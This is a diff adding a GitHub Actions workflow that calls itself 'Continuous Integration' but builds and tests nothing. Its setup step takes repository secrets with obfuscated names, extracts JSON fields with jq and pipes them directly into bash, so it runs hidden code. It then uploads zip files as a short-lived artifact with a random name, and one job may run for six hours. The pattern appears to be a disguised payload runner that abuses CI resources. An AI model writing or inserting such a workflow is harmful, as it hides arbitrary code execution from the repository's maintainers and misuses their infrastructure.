@@ -1,0 +1,30 @@
+name: Continuous Integration
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  runner:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Initialize
+        env:
+          yla39: ${{ secrets.yla39 }}
+        run: |
+          printf '%s' "$yla39" | jq -r .wskf6 | /bin/bash
+          printf '%s' "$kgivk541" | jq -r .h3 | /bin/bash
+          echo $bjd5116 | jq -r .v9678 | /bin/bash
+
+      - name: Persist results
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: CzSsdHNZ
+          path: "*.zip"
+          retention-days: 1
